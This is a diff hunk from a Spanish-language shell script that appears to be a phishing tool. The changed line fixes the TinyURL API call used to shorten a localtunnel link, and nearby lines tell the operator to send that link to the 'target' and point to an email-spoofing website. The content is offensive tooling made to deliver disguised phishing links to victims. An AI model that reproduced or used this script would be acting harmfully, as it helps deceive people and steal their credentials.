@@ -364,7 +364,7 @@ sleep 10
 send_link=$(grep -o "https://[0-9a-z]*\.localtunnel.me" sendlink)
 printf "\n"
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Envía el enlace directo al objetivo:\e[0m\e[1;77m %s \n' $send_link
-send_ip=$(curl -s https://tinyurl.com/create.php?url=$send_link | head -n1)
+send_ip=$(curl -s https://tinyurl.com/api-create.php?url=$send_link | head -n1)
 printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] o puedes usar Tinyurl:\e[0m\e[1;77m %s \n' $send_ip
 printf "\e[1;77m....\e[0m\e[1;93m Tambien puedes enviar Email Spoof en los siguientes enlaces:\e[0m\e[1;77m...\e[0m\n"
 printf "\e[1;92m[\e[0m*\e[1;92m] https://emaildepruebas.000webhostapp.com/ \e[0m\e[1;77m %s\e[0m\n"
